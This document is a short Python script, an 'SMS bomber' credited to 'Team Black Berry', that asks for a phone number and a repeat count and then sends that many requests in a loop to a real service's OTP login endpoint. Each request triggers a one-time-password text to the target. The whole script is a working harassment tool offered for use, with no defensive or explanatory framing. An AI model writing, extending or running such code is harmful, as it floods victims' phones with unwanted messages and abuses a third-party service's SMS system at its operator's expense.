import requests
from requests.structures import CaseInsensitiveDict
print("\033[H\033[J")
print("""
 _____  ____  ____    ____  ____  _      ____  _____ ____ 
/__ __\/  __\/  __\  /  __\/  _ \/ \__/|/  __\/  __//  __\
  / \  | | //| | //  | | //| / \|| |\/||| | //|  \  |  \/|
  | |  | |_\\| |_\\  | |_\\| \_/|| |  ||| |_\\|  /_ |    /
  \_/  \____/\____/  \____/\____/\_/  \|\____/\____\\_/\_\
  
  
  Aouther: MD ALAMIN HOSSEN
  Facebook : https://www.facebook.com/Lederteamblackberry
  CEO: Team Black Berry
  
  """)                                                        
number=str(input("Enter Your Number: "))
amount=int(input("Enter Your Amount: "))
url = "https://ss.binge.buzz/otp/send/login"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/x-www-form-urlencoded"

data = "phone="+number

for j in range(amount):
    resp = requests.post(url, headers=headers, data=data)
    print(str(j+1)+"TBB SMS SENT")